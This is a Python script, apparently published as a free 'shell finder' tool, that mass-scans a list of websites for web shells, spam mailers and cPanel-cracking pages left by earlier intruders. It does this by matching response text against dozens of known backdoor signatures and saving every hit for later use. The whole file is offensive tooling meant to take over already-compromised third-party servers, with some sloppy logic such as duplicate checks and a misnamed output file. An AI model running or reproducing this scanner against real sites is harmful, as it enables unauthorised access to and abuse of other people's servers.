#dont sell this tools
#this free tools 
import os, random, re, sys
from colorama import Fore,init
import requests
from multiprocessing.dummy import Pool
from ctypes import *
import datetime

headers = {'Connection': 'keep-alive',
           'Cache-Control': 'max-age=0',
           'Upgrade-Insecure-Requests': '1',
           'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
           'Accept-Encoding': 'gzip, deflate',
           'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
           'referer': 'www.google.com'}
requests.urllib3.disable_warnings()
os.system('cls' if os.name == 'nt' else 'clear')
if str(os.path.exists('Result')) == 'False':
    os.system('mkdir Result')
else:
    pass
kopisir = '''    

      )  (
     (   ) )
      ) ( (
 mrf_______)_
 .-'---------|  
( C|/\/\/\/\/|
 '-./\/\/\/\/|
   '_________'
    '-------'
'''
banner = '''
\033[92m                                         
 _____ _       _ _    _____ _       _         
|   __| |_ ___| | |  |   __|_|___ _| |___ ___ 
|__   |   | -_| | |  |   __| |   | . | -_|  _|
|_____|_|_|___|_|_|  |__|  |_|_|_|___|___|_|  
                                              
\033[97m[\033[92m ADVANCE SHELL FINDER \033[97m] Made By \033[92m'/Mine7\033[97m
[ \033[92mgithub.com/InMyMine7 \033[97m||\033[92m t.me/InMyMineee \033[97m]

\033[97m[\033[92m~\033[97m] 1. RUN BOT 
\033[97m[\033[91m!\033[97m] 2. BUY ME COFFE
'''
print(banner)
tool = input('\033[97m[\033[92m~\033[97m] : ')

if tool == "1":
    try:
        target = [i.strip() for i in open(input("\033[97m[\033[92m~\033[97m] ENTER YOUR LIST : "), mode='r').readlines()]
        sh = open('scan/shell.txt', 'r', errors='ignore').read().splitlines()
        dirr = open('scan/dir.txt', 'r', errors='ignore').read().splitlines()
    except KeyboardInterrupt:exit()
    except FileNotFoundError:print('\033[97m[\033[91m!\033[97m] FILE NOT FOUND SIR!!')

elif tool == "2":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(kopisir)
    print ('https://www.buymeacoffee.com/inmymine72 \n')

def URLdomain(site):
    if 'http://' not in site and 'https://' not in site:
        site = 'http://' + site
    if site[-1] != '/':
        site = site + '/'
    return site

def finder(url):
     try:
        for shellz in sh:
            for dirz in dirr:
                urlx = url + dirz + shellz
                xe = requests.get(urlx,headers=headers,verify=False,timeout=15)
                if '<input name="_upl" type="submit" id="_upl" value="Upload">' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n')

                if 'Uname:' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n')

                if '//0x5a455553.github.io/MARIJUANA/icon.png' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n')

                if 'Negat1ve Shell' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n')

                if '<input type="submit" name="submit" value="  >>">' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n')

                if 'type="file"><input type="submit" value="Upload"' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n')

                if '<span>Upload file:</span>' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n')

                if '{Ninja-Shell}' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n')

                if 'ALFA TEaM Shell - v4.1-Tesla' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n')    

                if '<pre align=center><form method=post>Password<br><input type=password name=pass' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n')   

                if 'Yanz Webshell!' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n')   

                if 'Tiny File Manager' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n')   

                if 'drwxr-xr-x' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n')   

                if 'input type="submit" name="upload" value="upload"' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n')   

                if '<title>D.R.S Dz</title>' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n')   

                if '<title>File manager</title>' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if '<br>https://t.me/teamanonforce' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if '<span>Mr.Combet Webshell</span>' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if '%PDF-0-1<form action' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if 'type="button">Upload File<' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if '[ HOME SHELL ]' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if '[+] MINI SH3LL BYPASS [+]' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if 'Madstore.sk! - Priv8 Sh3ll!' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if 'ALFA TEaM Shell - v4.1-Tesla' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if 'x3x3x3x_5h3ll' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if 'b374k 2.8' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if '<pre align=center><form method=post>Password: <input type=password name=pass>' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if 'L I E R SHELL' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if 'BlackDragon' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if 'Shell Bypass 403 GE-C666C' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if '>Upload: <input type="hidden" value="100000000" name="MAX_FILE_SIZE"><input type="file" name="upfile" id="ltb">' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if 'class="form-control" placeholder="@Passwrd" type="password" name="getpwd"' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell', 'a').write(urlx + '\n') 

                if 'Doc Root:' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if 'meta name="robots" content="noindex"><form method="post" enctype="multipart/form-data"><input type="file" name="btul"><button>Gaskan<' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if 'C0mmand ' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if 'Leaf PHPMailer' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/Mailer.txt', 'a').write(urlx + '\n') 

                if '>public_html' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if '-rw-r--r--' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if 'Gel4y Mini Shell' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                if 'm1n1 sh3ll' in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/WebShell.txt', 'a').write(urlx + '\n') 

                elif ' <title>Cpanel Crack'  in xe.text:
                    print ('\033[97m[\033[92m+\033[97m]\033[92m ' + url + ' \033[92m[We Found It]')
                    open('Result/Cpanel.txt', 'a').write(urlx + '\n') 

                else:
                    print ('\033[97m[\033[91m-\033[97m] ' + url + '  \033[91m[NOT FOUND]')
     except:pass

def main(url):
    try:
        url = URLdomain(url)
        finder(url)
    except KeyboardInterrupt:exit()
    except:
        pass

def InMyMine():
    try:
        mp = Pool(50)
        mp.map(main, target)
        mp.close()
        mp.join()
    except KeyboardInterrupt:exit()
    except:pass
InMyMine()